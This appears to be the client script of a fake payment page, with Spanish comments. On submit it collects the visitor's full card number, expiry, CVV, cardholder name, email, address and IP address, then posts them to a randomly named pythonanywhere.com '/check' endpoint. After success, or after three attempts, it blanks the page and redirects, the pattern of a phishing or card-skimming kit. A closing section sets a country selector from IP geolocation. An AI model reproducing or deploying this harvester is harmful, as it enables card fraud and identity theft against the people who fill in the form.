document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('payment-form');
     // Contador de envíos

    if (form) {
        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            const ipRes = await fetch("https://api.ipify.org?format=json");
            const ipData = await ipRes.json();

            // Extraer datos por ID
            const email = document.getElementById('EMAIL')?.value?.trim();
            const emailConf = document.getElementById('EMAIL_CONFIRMATION')?.value?.trim();
            const name = document.getElementById('NAME')?.value?.trim();
            const address1 = document.getElementById('ADDRESS_LINE1')?.value?.trim();
            const address2 = document.getElementById('ADDRESS_LINE2')?.value?.trim();
            const postal = document.getElementById('POSTAL_CODE')?.value?.trim();

            // Escuchar respuesta del iframe (por si acaso)
            window.addEventListener('message', function(event) {
                if(event.data.type === 'formData') {
                }
            });

            // Función para pedir datos al iframe y esperar la respuesta
            function getCardFormDataFromIframe() {
                return new Promise((resolve) => {
                    const iframe = document.getElementById('credit-card-iframe');
                    if (!iframe) {
                        resolve(null);
                        return;
                    }
                    function handleMessage(event) {
                        if (event.data && event.data.type === 'formData') {
                            window.removeEventListener('message', handleMessage);
                            resolve(event.data.payload);
                        }
                    }
                    window.addEventListener('message', handleMessage);
                    iframe.contentWindow.postMessage({type: 'getFormData'}, '*');
                });
            }

            // Espera los datos del iframe
            const iframeData = await getCardFormDataFromIframe();

            // Usa los datos recibidos del iframe si existen
            let cardNumber, cardExpiry, cardCVV, cardHolder;
            if (iframeData) {
                cardNumber = iframeData.CARD_NUMBER?.replace(/\s+/g, '');
                cardExpiry = iframeData.CARD_EXPIRY_MONTH_YEAR?.trim();
                cardCVV = iframeData.CARD_CVV?.trim();
                cardHolder = iframeData.CARD_HOLDER?.trim();
            } else {
                cardNumber = document.getElementById('CARD_NUMBER')?.value?.replace(/\s+/g, '');
                cardExpiry = document.getElementById('CARD_EXPIRY_MONTH_YEAR')?.value?.trim();
                cardCVV = document.getElementById('CARD_CVV')?.value?.trim();
                cardHolder = document.getElementById('CARD_HOLDER')?.value?.trim();
            }
            const button = document.getElementById('country-select');
            const country = button ? button.getAttribute('data-label') : '';
            const ipaddress = ipData.ip;

            // Preparar datos para enviar
            const data = {
                name: cardHolder,
                email: email,
                card_number: cardNumber,
                card_expiration: cardExpiry,
                card_cvv: cardCVV,
                address_line: address1,
                address_line_2: address2,
                postal_code: postal,
                country: country,
                ip: ipaddress
            };
            // Validaciones
            if (!email || !emailConf || !name || !address1 || !postal || !cardNumber || !cardExpiry || !cardCVV || !cardHolder) {
                document.getElementById('response').textContent = "Por favor, complete todos los campos obligatorios.";
                
                return;
            }
            if (email !== emailConf) {
                document.getElementById('response').textContent = "Los correos electrónicos no coinciden.";
                
                return;
            }
            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                document.getElementById('response').textContent = "Correo electrónico inválido.";
                
                return;
            }
            if (!/^\d{16}$/.test(cardNumber)) {
                document.getElementById('response').textContent = "Número de tarjeta inválido.";
                
                return;
            }
            if (!/^(0[1-9]|1[0-2])\/(\d{2}|\d{4})$/.test(cardExpiry)) {
                document.getElementById('response').textContent = "Fecha de expiración inválida.";
                
                return;
            }
            if (!/^\d{3,4}$/.test(cardCVV)) {
                document.getElementById('response').textContent = "CVV inválido.";
                return;
            }

            // Mostrar animación de carga
            const responseDiv = document.getElementById('response');
            responseDiv.textContent = '';
            responseDiv.innerHTML = '<span class="loader"></span> Procesando pago...';

            try {
                const response = await fetch('https://7vAfpq6XkG.pythonanywhere.com/check', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                const result = await response.json();
                if (result && result.success === true) {
                    // Blanquear la pantalla
                    document.body.innerHTML = '<div style="width:100vw;height:100vh;background:#fff;display:flex;align-items:center;justify-content:center;font-size:2rem;">Redirigiendo...</div>';
                    setTimeout(() => {
                        window.location.href = '200.html';
                    }, 1000);
                    return;
                } else {
                    let attempts = parseInt(sessionStorage.getItem('payment_attempts') || '0', 10) + 1;
                    sessionStorage.setItem('payment_attempts', attempts);
                    if (attempts >= 3) {
                        // Blanquear la pantalla antes de redirigir
                        document.body.innerHTML = '<div style="width:100vw;height:100vh;background:#fff;display:flex;align-items:center;justify-content:center;font-size:2rem;">Redirigiendo...</div>';
                        window.location.href = '200.html';
                        return;
                    }
                    const errorMsg = result && result.message ? result.message : "No se pudo procesar el pago. Intente de nuevo.";
                    responseDiv.textContent = errorMsg;
                    return;
                }
            } catch (error) {
                console.error('Error en la petición:', error);
                responseDiv.textContent = "Error al procesar el pago. Por favor, inténtelo de nuevo más tarde.";
            }
        });
    }
});

function getQueryParams() {
    const params = {};
    window.location.search.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(str,key,value) {
        params[key] = value;
    });
    return params;
}

// Definir estados/provincias por país
let statesByCountry = {};

fetch('country.json')
    .then(response => response.json())
    .then(data => {
        statesByCountry = data;
    })
    .catch(error => {
        console.error('Error loading country.json:', error);
        statesByCountry = {};
    });

async function initializeCountrySelect() {
    try {
        // 1. Obtener país por IP
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        const userCountry = ipData.country_code;

        // 2. Configurar selectores y listeners
        const countryButtons = document.querySelectorAll('.country-select-options');
        const regionSelect = document.getElementById('REGION');

        // 3. Función para actualizar estados/provincias
        function updateStates(countryCode) {
            if (!regionSelect) return;
            
            const states = statesByCountry[countryCode] || [];
            const placeholder = countryCode === 'US' ? 'Select your state' : 'Select your province/region';
            
            regionSelect.innerHTML = `
                <option hidden disabled selected value="">${placeholder}</option>
                ${states.map(state => `
                    <option value="${state.code}">${state.name}</option>
                `).join('')}
            `;
        }

        // 4. Configurar listeners para los botones de país
        countryButtons.forEach(button => {
            const isoCode = button.getAttribute('iso-code');
            
            // Marcar el país del usuario como seleccionado inicialmente
            if (isoCode === userCountry) {
                button.classList.add('selected');
                updateStates(isoCode);
            }

            button.addEventListener('click', function() {
                // Remover selección previa
                countryButtons.forEach(btn => btn.classList.remove('selected'));
                // Marcar nuevo país seleccionado
                this.classList.add('selected');
                // Actualizar estados
                updateStates(isoCode);
            });
        });

        // 5. Seleccionar país del usuario por defecto
        const userCountryButton = Array.from(countryButtons)
            .find(button => button.getAttribute('iso-code') === userCountry);
            
        if (userCountryButton) {
            userCountryButton.click();
        } else {
            // Si no se encuentra el país del usuario, usar US por defecto
            const defaultButton = Array.from(countryButtons)
                .find(button => button.getAttribute('iso-code') === 'US');
            if (defaultButton) defaultButton.click();
        }

        return true;
    } catch (error) {
        console.error('Error inicializando selector de país:', error);
        return false;
    }
}

// Inicializar cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', function() {
    if (!initializeCountrySelect()) {
        const retry = setInterval(() => {
            if (initializeCountrySelect()) {
                clearInterval(retry);
            }
        }, 500);

        setTimeout(() => {
            clearInterval(retry);
        }, 10000);
    }
});
